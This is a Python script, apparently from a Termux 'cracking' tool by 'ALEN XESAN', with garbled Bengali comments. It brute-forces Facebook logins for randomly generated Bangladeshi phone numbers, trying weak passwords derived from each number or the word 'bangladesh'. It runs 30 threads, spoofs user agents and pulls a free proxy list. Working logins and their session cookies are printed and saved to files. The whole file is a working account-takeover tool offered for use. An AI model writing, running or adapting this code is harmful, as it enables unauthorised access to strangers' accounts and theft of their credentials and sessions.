#Script рждрзЛ ржирж┐рждрзЗ ржЖрж╕рж▓рж╛ ржПржХрж╛ржЙржирзНржЯ ржЯрж╛ ржлрж▓рзЛ ржХрж░рж▓рзЗ ржХрж┐ рж╣рзЯ рж╣рзБржоЁЯШХ
#ржПржХрж╛ржЙржирзНржЯ ржлрж▓рзЛ ржЖрж░ ржПржЗ Respotary рждрзЗ ржПржХржЯрж╛ Star ржжрж┐рзЯрж╛ ржпрж╛ржЗржУЁЯШК
#----------------------------------------------------------------------------------------------------------
#CREATE BY : ALEN XESAN
#WHATSAPP : +8801566*****4
#GITHUB : https://github.com/XESAN-VAU
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
 \033[1;97m╔════════════════════════════════╗   
 \033[1;97m║ \033[1;95m╔═╗╦  ╔═╗╔╗╔  ═╗ ╦╔═╗╔═╗╔═╗╔╗╔\033[1;97m ║
 \033[1;97m║ \033[1;92m╠═╣║  ║╣ ║║║  ╔╩╦╝║╣ ╚═╗╠═╣║║║ \033[1;97m║
 \033[1;97m║ \033[1;93m╩ ╩╩═╝╚═╝╝╚╝  ╩ ╚═╚═╝╚═╝╩ ╩╝╚╝ \033[1;97m║
 \033[1;97m╚════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALEN XESAN \033[1;90m<\033[1;92m•\033[1;90m> \033[1;95mversion 0.1 \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)

logo1 = ("""
 \033[1;97m╔════════════════════════════════╗   
 \033[1;97m║ \033[1;95m╔═╗╦  ╔═╗╔╗╔  ═╗ ╦╔═╗╔═╗╔═╗╔╗╔\033[1;97m ║
 \033[1;97m║ \033[1;92m╠═╣║  ║╣ ║║║  ╔╩╦╝║╣ ╚═╗╠═╣║║║ \033[1;97m║
 \033[1;97m║ \033[1;93m╩ ╩╩═╝╚═╝╝╚╝  ╩ ╚═╚═╝╚═╝╩ ╩╝╚╝ \033[1;97m║
 \033[1;97m╚════════════════════════════════╝
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALEN XESAN \033[1;90m<\033[1;92m•\033[1;90m> \033[1;95mversion 0.1 \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)

def mumitx():
	print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")

def Main():
        os.system("clear")
        print(logo)
        print("\033[1;35m[\033[1;32mA\033[1;35m]\033[1;32m RANDOM CRACK")
        print("\033[1;35m[\033[1;32mB\033[1;35m]\033[1;32m Exit")
        Mumit =input("\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m Choose : ")
        if Mumit in ["A","01"]:
            fuck()
        if Mumit in [" B", "00"]:
            exit()
        else:
            exit()
            
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE CODE: 017, 018, 019, 016')
    code = input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Total ids: '+tl)
        print("\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Your Code: "+code)
        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Process has been started')
        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Use flight mode for speed up')
        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
        for guru in user:
            uid = code+guru
            pwx = [guru,uid,uid[:7],uid[:6],'bangladesh']
            yaari.submit(mumit2,uid,pwx,tl)
    print(mumitx)
    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Crack process has been completed')
    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m OK Ids saved in ALEN/OK.txt')
    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m CP Ids saved in ALEN/CP.txt')
    print(mumitx)
       
def mumit2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r\033[1;92m[ALEN]<•>[%s/%s]<•>[OK-%s]<•>[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"LM-G710N"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\033[38;5;46m[ALEN-OK💚] {uid}|{ps} \nCookie : {coki}")
                open('/sdcard/ALEN/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[ALEN-CP💔] {cid}|{ps}")
                open('/sdcard/ALEN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
